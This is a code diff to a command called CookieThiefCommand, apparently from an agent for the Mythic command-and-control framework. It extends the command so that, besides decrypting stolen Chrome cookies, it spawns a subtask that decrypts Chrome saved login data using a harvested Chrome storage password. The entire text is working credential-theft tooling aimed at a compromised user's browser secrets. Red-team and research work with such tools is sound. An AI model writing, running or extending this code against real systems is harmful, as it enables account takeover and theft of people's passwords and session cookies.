@@ -126,11 +126,28 @@ class CookieThiefCommand(CommandBase):
                                                                             },
                                                                             subtask_callback_function="decrypted_cookies")
                             if cookie_decrypt_task.status == MythicRPCStatus.Success:
-                                return task
+                                continue
                             else:
                                 await MythicRPC().execute("create_output", task=task.id,
                                                           output=cookie_decrypt_task.error)
                                 task.status = MythicStatus("Error: Decrypt Cookie Error")
+                        if "data" in f["filename"].lower():
+                            cookie_decrypt_task = await MythicRPC().execute("create_subtask",
+                                                                            parent_task_id=task.id,
+                                                                            command="decrypt_chrome_login_data",
+                                                                            params_dict={
+                                                                                "username": task.args.get_arg("username"),
+                                                                                "password": chrome_password.response[0]["credential"],
+                                                                                "file_id": f["agent_file_id"]
+                                                                            },
+                                                                            subtask_callback_function="decrypted_cookies")
+                            if cookie_decrypt_task.status == MythicRPCStatus.Success:
+                                continue
+                            else:
+                                await MythicRPC().execute("create_output", task=task.id,
+                                                          output=cookie_decrypt_task.error)
+                                task.status = MythicStatus("Error: Decrypt Cookie Error")
+                    return task
             else:
                 await MythicRPC().execute("create_output", task=task.id,
                                           output=f"Failed to find a chrome storage password for {task.args.get_arg('username')}")
